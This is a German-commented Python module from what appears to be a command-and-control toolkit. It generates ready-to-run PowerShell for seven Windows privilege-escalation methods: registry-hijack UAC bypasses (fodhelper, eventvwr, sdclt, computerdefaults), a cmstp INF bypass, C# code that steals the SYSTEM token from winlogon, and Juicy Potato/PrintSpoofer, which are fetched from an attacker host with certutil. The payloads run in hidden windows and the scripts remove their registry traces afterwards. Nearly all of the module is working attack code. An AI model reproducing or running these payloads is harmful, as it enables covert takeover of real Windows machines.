"""
UAC Bypass Suite — 7 Methoden, kein Tool-Upload nötig.

Alle Techniken nutzen Windows-Bordmittel (Living off the Land).
Jede Methode funktioniert auf anderen Windows-Versionen —
der Scanner zeigt welche auf dem Ziel verfügbar sind.

Methoden:
  1. fodhelper     — Win10/11, Registry HKCU (kein Admin zum schreiben)
  2. eventvwr      — Win7-10, Registry HKCU mscfile
  3. sdclt         — Win10, IsolatedCommand via Registry
  4. computerdefaults — Win10/11, HKCU ms-settings
  5. cmstp         — Win7-11, INF-Datei + COM-Exploit
  6. Token Steal   — stiehlt SYSTEM-Token von winlogon (braucht Admin→SYSTEM)
  7. Juicy Potato  — SeImpersonatePrivilege → SYSTEM (Service Accounts, IIS, SQL)

Alle via PowerShell ausführbar — kein Datei-Upload.
"""

from __future__ import annotations
import random
import string


def _r(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


# ── 1. fodhelper UAC Bypass ───────────────────────────────────────────────────

def uac_fodhelper(payload: str) -> str:
    """
    fodhelper.exe UAC Bypass — Win10 / Win11 (bis Build 22H2+, teils gepatcht).
    Schreibt in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command.
    Kein Admin zum Schreiben nötig — HKCU ist user-beschreibbar.
    AutoElevate: fodhelper startet mit hohen Rechten und liest Registry → führt Payload aus.
    """
    key = _r()
    return f"""# UAC Bypass: fodhelper (Win10/11)
New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "{payload}" -Force
Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3
# Aufräumen:
Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] fodhelper UAC Bypass ausgeführt"
"""


# ── 2. eventvwr UAC Bypass ────────────────────────────────────────────────────

def uac_eventvwr(payload: str) -> str:
    """
    eventvwr.exe UAC Bypass — Win7 / Win8 / Win10.
    Schreibt in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command.
    eventvwr.exe ist AutoElevate und startet mmc.exe → liest diese Registry-Key.
    """
    return f"""# UAC Bypass: eventvwr (Win7-10)
New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value "{payload}" -Force
Start-Process "C:\\Windows\\System32\\eventvwr.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3
# Aufräumen:
Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] eventvwr UAC Bypass ausgeführt"
"""


# ── 3. sdclt UAC Bypass ───────────────────────────────────────────────────────

def uac_sdclt(payload: str) -> str:
    """
    sdclt.exe UAC Bypass — Windows 10.
    sdclt.exe ist AutoElevate — liest IsolatedCommand aus HKCU.
    Sehr zuverlässig auf Win10 vor 2019 Patches.
    """
    return f"""# UAC Bypass: sdclt (Win10)
New-Item -Path "HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Name "(default)" -Value "{payload}" -Force
New-ItemProperty -Path "HKCU:\\Software\\Classes\\Folder\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Start-Process -FilePath "C:\\Windows\\System32\\sdclt.exe" -ArgumentList "/KickOffElev" -WindowStyle Hidden
Start-Sleep -Seconds 3
# Aufräumen:
Remove-Item -Path "HKCU:\\Software\\Classes\\Folder" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] sdclt UAC Bypass ausgeführt"
"""


# ── 4. computerdefaults UAC Bypass ────────────────────────────────────────────

def uac_computerdefaults(payload: str) -> str:
    """
    computerdefaults.exe — Win10 Build 1803+, sehr zuverlässig.
    Ähnlich wie fodhelper aber nutzt ms-settings COM Handler.
    """
    return f"""# UAC Bypass: computerdefaults (Win10 1803+)
New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "{payload}" -Force
Start-Process "C:\\Windows\\System32\\computerdefaults.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3
# Aufräumen:
Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[+] computerdefaults UAC Bypass ausgeführt"
"""


# ── 5. cmstp UAC Bypass ───────────────────────────────────────────────────────

def uac_cmstp(payload: str, kali_ip: str = "10.10.10.1") -> tuple[str, str]:
    """
    cmstp.exe UAC Bypass — Win7-Win11, sehr zuverlässig.
    Erstellt eine INF-Datei + startet cmstp.exe mit AutoElevate.
    Nutzt COM-Interface um UAC-Prompt zu überspringen.
    Gibt zurück: (inf_content, ps1_command)
    """
    inf_name = f"{_r()}.inf"
    inf_content = f"""[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", "DLL", "", "JUNK"

[DefaultInstall.Services]
AddService=BITS,,BITSServiceInstall

[BITSServiceInstall]

[Strings]
ServiceName="BITS"
ShortSvcName="BITS"

[Setup Commands]
RunPreSetupCommands=Setup_commands

[Setup_commands]
{payload}
"""
    ps1 = f"""$inf = @'
{inf_content}
'@
$tmp = "$env:TEMP\\{inf_name}"
$inf | Set-Content $tmp
$cmstp = "$env:WINDIR\\System32\\cmstp.exe"
Start-Process $cmstp -ArgumentList "/au $tmp" -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
Write-Host "[+] cmstp UAC Bypass ausgeführt"
"""
    return inf_content, ps1


# ── 6. Token Steal (Admin → SYSTEM) ──────────────────────────────────────────

def uac_token_steal() -> str:
    """
    Token Impersonation: stiehlt SYSTEM-Token von winlogon.exe.
    Braucht: bereits Admin-Kontext (elevated).
    Ergebnis: whoami zeigt NT AUTHORITY\\SYSTEM.
    Nützlich um von Admin auf SYSTEM zu eskalieren (z.B. für SAM-Dump).
    """
    return r"""# Token Steal: Admin → SYSTEM (via winlogon)
$code = @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class TS {
    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
    [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr attr, int imp, int type, out IntPtr nt);
    [DllImport("advapi32.dll")] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool i, int pid);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();

    public static bool Steal() {
        foreach (var p in Process.GetProcessesByName("winlogon")) {
            IntPtr ph = OpenProcess(0x400, false, p.Id);
            if (ph == IntPtr.Zero) continue;
            IntPtr tok; OpenProcessToken(ph, 0xF01FF, out tok);
            IntPtr dup; DuplicateTokenEx(tok, 0xF01FF, IntPtr.Zero, 2, 1, out dup);
            return ImpersonateLoggedOnUser(dup);
        }
        return false;
    }
}
'@
Add-Type -TypeDefinition $code
if ([TS]::Steal()) {
    Write-Host "[+] Token gestohlen: $(whoami)"
} else {
    Write-Host "[-] Fehler — braucht Admin-Kontext"
}
"""


# ── 7. Juicy Potato (SeImpersonatePrivilege → SYSTEM) ────────────────────────

def uac_juicy_potato(payload: str, kali_ip: str = "10.10.10.1") -> str:
    """
    Juicy Potato: nutzt SeImpersonatePrivilege um SYSTEM zu werden.
    Funktioniert bei: IIS-App-Pool, SQL Server, Service Accounts.
    Braucht: JuicyPotato.exe auf Ziel (oder Sweet/Rogue Potato für neuere Systeme).
    Win10 1809+ → Sweet Potato / PrintSpoofer stattdessen.
    """
    return f"""# Juicy Potato: SeImpersonatePrivilege → SYSTEM
# Prüfen ob SeImpersonatePrivilege vorhanden:
whoami /priv | Select-String "SeImpersonatePrivilege"

# JuicyPotato von Kali laden (erst HTTP-Server starten: python3 -m http.server 8080):
certutil -urlcache -f http://{kali_ip}:8080/JuicyPotato.exe C:\\Windows\\Temp\\jp.exe

# Ausführen (CLSID für Win10: {{e60687f7-01a1-40aa-86ac-db1cbf673334}}):
C:\\Windows\\Temp\\jp.exe -l 1337 -p "{payload}" -t * -c "{{e60687f7-01a1-40aa-86ac-db1cbf673334}}"

# Für Win10 1809+: PrintSpoofer (kein CLSID nötig):
certutil -urlcache -f http://{kali_ip}:8080/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe
C:\\Windows\\Temp\\ps.exe -i -c "{payload}"

# Download-Links für Kali:
# JuicyPotato:  https://github.com/ohpe/juicy-potato/releases
# PrintSpoofer: https://github.com/itm4n/PrintSpoofer/releases
# Sweet Potato: https://github.com/CCob/SweetPotato/releases
"""


# ── UAC Level Check ───────────────────────────────────────────────────────────

def uac_check_ps1() -> str:
    """Prüft UAC-Level und empfiehlt passende Bypass-Methode."""
    return r"""# UAC Level Check + Bypass-Empfehlung
$uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$level  = (Get-ItemProperty $uacKey).ConsentPromptBehaviorAdmin
$luaOn  = (Get-ItemProperty $uacKey).EnableLUA

Write-Host "[*] UAC Konfiguration:"
Write-Host "    EnableLUA:                    $luaOn"
Write-Host "    ConsentPromptBehaviorAdmin:   $level"
Write-Host ""

switch ($level) {
    0 { Write-Host "[!] UAC DEAKTIVIERT — kein Bypass nötig!" -ForegroundColor Green }
    1 { Write-Host "[+] Level 1: Credential prompt — Bypass möglich via fodhelper/eventvwr" -ForegroundColor Yellow }
    2 { Write-Host "[+] Level 2: Consent prompt (DEFAULT) — fodhelper/computerdefaults empfohlen" -ForegroundColor Yellow }
    5 { Write-Host "[+] Level 5: Consent for non-Windows — Bypass meist möglich" -ForegroundColor Yellow }
    default { Write-Host "[-] Unbekannter Level $level" -ForegroundColor Red }
}

# Windows-Version prüfen
$os = [System.Environment]::OSVersion.Version
Write-Host ""
Write-Host "[*] Windows: $($os.Major).$($os.Minor) Build $($os.Build)"
if ($os.Build -ge 22000) {
    Write-Host "    → Win11: computerdefaults / fodhelper empfohlen"
} elseif ($os.Build -ge 17763) {
    Write-Host "    → Win10 1809+: computerdefaults, sdclt, cmstp"
} else {
    Write-Host "    → Win10 <1809 / Win7: eventvwr, cmstp sehr zuverlässig"
}

# Token-Rechte prüfen
Write-Host ""
Write-Host "[*] Aktuelle Token-Rechte:"
whoami /priv | Select-String "Enabled|Aktiviert" | ForEach-Object {
    Write-Host "    $_" -ForegroundColor Cyan
}
"""


async def show_uac_overview() -> "AsyncGenerator[str, None]":
    from typing import AsyncGenerator
    yield "\033[1;36m[*] UAC Bypass Methoden:\033[0m\n"

    methods = [
        ("fodhelper",          "Win10/11",    "🔴", "Registry HKCU ms-settings, sehr verbreitet"),
        ("eventvwr",           "Win7-10",     "🔴", "Registry HKCU mscfile, klassisch zuverlässig"),
        ("sdclt",              "Win10",       "🔴", "IsolatedCommand + DelegateExecute"),
        ("computerdefaults",   "Win10 1803+", "🔴", "Wie fodhelper, andere Binary"),
        ("cmstp",              "Win7-11",     "⛔", "INF-Datei + COM, sehr zuverlässig"),
        ("Token Steal",        "Admin→SYSTEM","⛔", "winlogon Token stehlen (braucht Admin)"),
        ("Juicy/PrintSpoofer", "Service Acc.", "⛔", "SeImpersonatePrivilege → SYSTEM"),
    ]

    for name, target, danger, desc in methods:
        yield f"  {danger} \033[33m{name:<22}\033[0m \033[90m{target:<15}\033[0m {desc}"

    yield ""
    yield "\033[36m[→] Option U im C2-Menü für interaktiven Builder\033[0m"
